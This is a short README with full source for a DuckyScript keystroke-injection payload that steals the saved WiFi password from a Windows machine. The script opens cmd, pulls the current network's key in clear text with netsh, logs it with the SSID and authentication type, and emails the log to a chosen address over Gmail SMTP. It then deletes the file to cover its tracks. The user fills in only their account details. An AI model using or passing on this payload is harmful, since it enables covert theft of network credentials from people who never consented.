# This payload:
1. Opens CMD
2. Finds the key (password) of the WiFi the target is connected to
3. Saves the SSID, Network type, Authentication and the key to Log.txt
4. And emails Log.txt via gmail

### Change the following things;
* **ACCOUNT**: Your **gmail account**
* **PASSWORD**: Your **gmail password**
* **RECEIVER**: The email you want to send Log.txt to

If you have **any suggestions** please **tell me**.

## **Code**:
```
REM Author: Siem
REM Version: 2.1
REM Description: Clear text WiFi key grabber
DELAY 2500
WINDOWS d

REM --> Open cmd
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 1000

REM --> Getting SSID
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "B"') do set A=%A
ENTER

REM --> Creating Temp.txt
STRING netsh wlan show profiles %A% | findstr "Network type" | findstr /v "broadcast" | findstr /v "Radio">>Temp.txt & netsh wlan show profiles %A% | findstr "Authentication">>Temp.txt & netsh wlan show profiles %A% key=clear | findstr "Key Content">>Temp.txt
ENTER

REM --> Get network type
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" Temp.txt') do set B=%A
ENTER

REM --> Get authentication
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" Temp.txt') do set C=%A
ENTER

REM --> Get key
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" Temp.txt') do set D=%A
ENTER

REM --> Delete Temp.txt
STRING del Temp.txt
ENTER

REM --> Create Log.txt
STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
ENTER

REM --> Mail Log.txt
STRING powershell
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
ENTER
STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi'
ENTER
STRING $ReportEmail.Body = 'The log is attached!'
ENTER
STRING $ReportEmail.Attachments.Add('Log.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
STRING exit
ENTER

REM --> Delete Log.txt and exit
STRING del Log.txt & exit
ENTER
```